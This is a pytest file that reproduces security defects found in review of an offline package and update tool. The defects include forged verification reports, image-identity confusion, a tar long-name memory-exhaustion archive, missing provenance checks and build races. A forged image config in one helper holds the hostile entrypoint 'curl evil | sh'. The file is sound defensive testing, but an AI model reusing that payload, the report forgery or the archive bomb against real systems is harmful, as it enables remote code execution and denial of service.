"""Phase 12D4 re-review: REPRODUCTION tests for the offline update tool (package trust, image identity and build).

Written by a fresh-context sub-reviewer of this session (it was given the code
of scripts/offline/offline_package.py, not the Phase 12D3 conclusions), then
re-run and read by the main reviewer. Convention of THIS file: every test
REPRODUCES a defect - it asserts the unsafe outcome and therefore PASSES while
the defect exists. When a later phase fixes a defect its test fails and must be
inverted into a regression test. Findings: docs/review/PHASE12D4_NEW_FINDINGS.json.

``docker`` is the stateful fake of tests/test_offline_package.py (no Docker
daemon in Cloud); git, tar and SHA-256 are real.
"""

# ruff: noqa

import hashlib
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
from pathlib import Path

import pytest

import test_offline_package as T
from test_offline_package import (  # noqa: F401
    completed, deployment, fake_docker, git_deployment, health_server, package, repo, signing,
)

OP = T.OP


def test_forged_verify_report_replaces_authentication(package, fake_docker, health_server, signing, tmp_path, monkeypatch):
    """A release key IS installed on the server. A tree that never went through `verify`
    (no signature, no trusted hash), plus a hand-written verify-report.json next to it, is
    accepted by preflight / update --apply and its image is loaded and started."""
    pkg, _digest = package  # unsigned; pretend the attacker made it
    _key, signers = signing
    drop = tmp_path / "incoming"
    drop.mkdir()
    subprocess.run(["tar", "-xzf", str(pkg), "-C", str(drop)], check=True)  # NOT verify
    root = next(p for p in drop.iterdir() if p.is_dir())
    # attacker edits the manifest freely (here: claims to support any version)
    m = json.loads((root / "manifest.json").read_text())
    m["application"]["supported_source_versions"] = ["1.2.0", "0.0.1"]
    (root / "manifest.json").write_text(json.dumps(m))
    (drop / "verify-report.json").write_text(json.dumps({
        "result": "VERIFIED", "package_dir": str(root.resolve()), "signed": False,
        "manifest_sha256": hashlib.sha256((root / "manifest.json").read_bytes()).hexdigest(),
        "package_sha256": "0" * 64,
    }))
    fake_docker.forget_image(m["image"]["tag"])
    deploy = tmp_path / "deploy"
    deploy.mkdir()
    (deploy / "docker-compose.yml").write_text("services: {}\n")
    conf = T._write_conf(tmp_path, deploy, health_server, ALLOWED_SIGNERS=signers)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    assert T._server("preflight", conf, root, "--backup-reference", "bk") == 0
    rc = T._apply(conf, root)
    print("PROOF update rc", rc, "running", fake_docker.app()["image_id"][:19],
          "loads", sum(1 for c in fake_docker.calls() if c[0] == "load"))
    assert rc == 0 and fake_docker.app()["image_id"] == T.IMAGE_ID


def _same_layers_other_config():
    cfg = json.loads(T.NEW_CONFIG)
    cfg["config"] = {"Entrypoint": ["/bin/sh", "-c", "curl evil | sh"], "User": "root",
                     "Env": ["SURREAL_URL=ws://elsewhere:8000"]}
    text = json.dumps(cfg, sort_keys=True)
    return text, T._config_id(text)


def test_image_with_same_layers_but_another_config_is_recognised_as_the_packaged_one(deployment, fake_docker, capsys):
    conf, pkg_dir, _ = deployment
    manifest = json.loads((pkg_dir / "manifest.json").read_text())
    text, evil_id = _same_layers_other_config()
    assert evil_id != manifest["image"]["id"] and evil_id != manifest["image"]["config_digest"]
    how = OP.same_image(evil_id, json.loads(text)["rootfs"]["diff_ids"], manifest["image"])
    assert how == "layer digests (other image store)"

    def plant(s):
        s["image_configs"][evil_id] = text
        s["images"][T.TARGET] = evil_id

    fake_docker.edit(plant)
    capsys.readouterr()
    rc = T._server("preflight", conf, pkg_dir, "--backup-reference", "bk")
    out = capsys.readouterr().out
    print("PROOF same_image ->", how, "| preflight rc", rc,
          [l.split("] ", 1)[1] for l in out.splitlines() if "image tag free" in l])
    assert rc == 0


def test_pre_authentication_memory_use_is_unbounded(tmp_path):
    """inspect_archive runs before any authentication. A GNU long-name / pax header is
    read into memory in one piece by tarfile: its size is not limited by MAX_* (those
    only count regular members), so a ~0.4 MB package makes the root process allocate
    hundreds of MB (64 GiB declared -> OOM)."""
    size = 400 * 1024 * 1024
    evil = tmp_path / "evil.tar.gz"
    with tarfile.open(evil, "w:gz", format=tarfile.GNU_FORMAT) as tar:
        info = tarfile.TarInfo("././@LongLink")
        info.type = tarfile.GNUTYPE_LONGNAME
        info.size = size

        class Zeros(io.RawIOBase):
            left = size

            def read(self, n=-1):
                n = min(n if n >= 0 else self.left, self.left)
                self.left -= n
                return b"\0" * n

        tar.addfile(info, Zeros())
        reg = tarfile.TarInfo("pkg/manifest.json")
        reg.size = 2
        tar.addfile(reg, io.BytesIO(b"{}"))
    code = (
        "import re, sys\n"
        "hwm = lambda: int(re.search(r'VmHWM:\\s+(\\d+)', open('/proc/self/status').read()).group(1))\n"
        f"sys.path.insert(0, {str(T.ROOT / 'scripts' / 'offline')!r})\n"
        "import offline_package as OP\n"
        "rc = OP.main(['verify', sys.argv[1], '--extract-to', sys.argv[2], '--expected-sha256', '0'*64])\n"
        "base = hwm()\n"
        "try:\n    OP.inspect_archive(OP.Path(sys.argv[1]))\nexcept OP.Refused as e:\n    print('refused:', e)\n"
        "print('RSS_MB', base // 1024, hwm() // 1024)\n"
    )
    out = subprocess.run([sys.executable, "-c", code, str(evil), str(tmp_path / "x")],
                         capture_output=True, text=True, check=True).stdout
    before, after = [int(x) for x in out.split("RSS_MB")[1].split()]
    print("PROOF package bytes", evil.stat().st_size, "| peak RSS before/after inspect_archive (MB):", before, after)
    assert evil.stat().st_size < 1024 * 1024 and after - before > 350


def test_build_accepts_an_image_with_no_provenance_at_all(fake_docker, repo, tmp_path):
    """No revision label and no /app/VERSION in the image: nothing ties the image to the
    commit that is bundled, and the build still succeeds (manifest claims source.commit)."""
    fake_docker.edit(lambda s: (s["inventory"].update(app_version=None), s.update(labels={})))
    pkg, _ = T._build(repo, tmp_path)
    m = T._manifest_of(pkg)
    print("PROOF built; manifest source.commit", m["source"]["commit"][:12], "image labels", m["image"]["labels"])
    # an explicit, wrong revision label is refused - so the check exists, but is optional
    fake_docker.edit(lambda s: s.update(labels={"org.opencontainers.image.revision": "0" * 40}))
    assert T._build_rc(repo, tmp_path / "d2") == OP.EXIT_USAGE
    # ...and a label of ANOTHER VERSION is not looked at
    fake_docker.edit(lambda s: s.update(labels={"org.opencontainers.image.version": "9.9.9"}))
    assert T._build_rc(repo, tmp_path / "d3") == 0


def test_failed_rebuild_deletes_the_previous_good_package(fake_docker, repo, tmp_path):
    pkg, digest = T._build(repo, tmp_path)
    sha_file = Path(str(pkg) + ".sha256")
    assert pkg.exists() and sha_file.exists()
    shutil.rmtree(pkg.with_name(pkg.name[: -len(".tar.gz")]))  # "remove it" as the tool asks
    fake_docker.set(save_rc=1)  # the rebuild fails (docker save error)
    assert T._build_rc(repo, tmp_path / "dist") == OP.EXIT_UPDATE
    print("PROOF package exists:", pkg.exists(), "| stale .sha256 still there:", sha_file.exists())
    assert not pkg.exists() and sha_file.exists()


def test_two_builds_racing_destroy_each_other(fake_docker, repo, tmp_path, monkeypatch):
    """The 'stage exists' check and the first mkdir are separated by four git calls. A
    second builder that passes the check in that window dies with a traceback (not a
    Refused) and its cleanup removes the FIRST builder's stage folder and package."""
    out = tmp_path / "dist"
    name = "ChatBot5400-1.3.0-rc.1-linux-amd64-offline"
    real = OP.check_build_version

    def other_builder_starts(repo_, commit, requested):
        (out / name / "images").mkdir(parents=True)  # builder A is now working here
        (out / name / "images" / "A-is-saving.tar").write_text("A")
        (out / f"{name}.tar.gz").write_text("A's finished package from a previous run")
        return real(repo_, commit, requested)

    monkeypatch.setattr(OP, "check_build_version", other_builder_starts)
    with pytest.raises(FileExistsError):
        T._build_rc(repo, out)
    print("PROOF A's stage exists:", (out / name).exists(), "| A's package exists:", (out / f"{name}.tar.gz").exists())
    assert not (out / name).exists() and not (out / f"{name}.tar.gz").exists()
